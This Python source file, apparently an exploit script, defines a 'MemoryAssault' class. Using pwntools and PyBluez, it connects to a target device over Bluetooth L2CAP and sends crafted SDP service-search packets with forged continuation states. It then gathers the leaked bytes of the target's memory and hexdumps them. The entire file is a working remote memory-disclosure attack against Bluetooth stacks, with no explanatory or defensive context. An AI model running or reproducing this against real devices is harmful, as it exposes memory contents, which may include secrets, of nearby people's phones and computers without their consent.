from pwn import *
import bluetooth


class MemoryAssault:

    def __init__(self, target, service_long=0x0100, service_short=0x0001, mtu=50, n=30):
        self.target = target
        self.service_long = service_long
        self.service_short = service_short
        self.mtu = mtu
        self.n = n

    def packet(self, service, continuation_state):
        pkt = '\x02\x00\x00'
        pkt += p16(7 + len(continuation_state))
        pkt += '\x35\x03\x19'
        pkt += p16(service)
        pkt += '\x01\x00'
        pkt += continuation_state

        return pkt

    def attack(self):
        try:
            p = log.progress('Exploit')
            p.status('Creating L2CAP socket')

            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            bluetooth.set_l2cap_mtu(sock, self.mtu)
            context.endian = 'big'

            p.status('Connecting to target')
            sock.connect((self.target, 1))

            p.status('Sending packet 0')
            sock.send(self.packet(self.service_long, '\x00'))
            data = sock.recv(self.mtu)

            if data[-3] != '\x02':
                p.failure('Invalid continuation state received.')

            stack = ''

            for i in range(1, self.n):
                p.status('Sending packet %d' % i)
                sock.send(self.packet(self.service_short, data[-3:]))
                data = sock.recv(self.mtu)
                stack += data[9:-3]

            sock.close()

            p.success('Done')

            print(hexdump(stack))
            return hexdump(stack)
        except (Exception):
            print('Could not make the attack')
